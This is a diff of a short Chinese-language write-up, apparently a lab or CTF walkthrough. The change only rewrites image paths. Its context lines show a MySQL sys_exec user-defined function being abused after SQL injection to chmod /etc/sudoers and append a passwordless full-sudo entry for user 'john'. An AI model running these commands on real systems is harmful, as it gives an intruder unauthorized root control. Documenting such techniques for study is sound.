@@ -19,10 +19,11 @@ select sys_exec('chmod 0440 /etc/sudoers');
 select sys_exec('echo "john ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers');
 ```
 
-sql注入获得数据库权限，利用自建函数，sys_exec 将用户john加入超级用户文件sudoers![image-20230208170613569](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170613569.png)
+sql注入获得数据库权限，利用自建函数，sys_exec 将用户john加入超级用户文件sudoers![image-20230208170613569](/image/image-20230208170613569.png)
 
-![image-20230208170506879](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170506879.png)
+![image-20230208170506879](/image/image-20230208170506879.png)
 
-![image-20230208170458827](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170458827.png)
+![image-20230208170458827](/image/image-20230208170458827.png)
 
-![image-20230208170728394](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230208170728394.png)
+![image-20230208170728394](/image/image-20230208170728394.png)
+
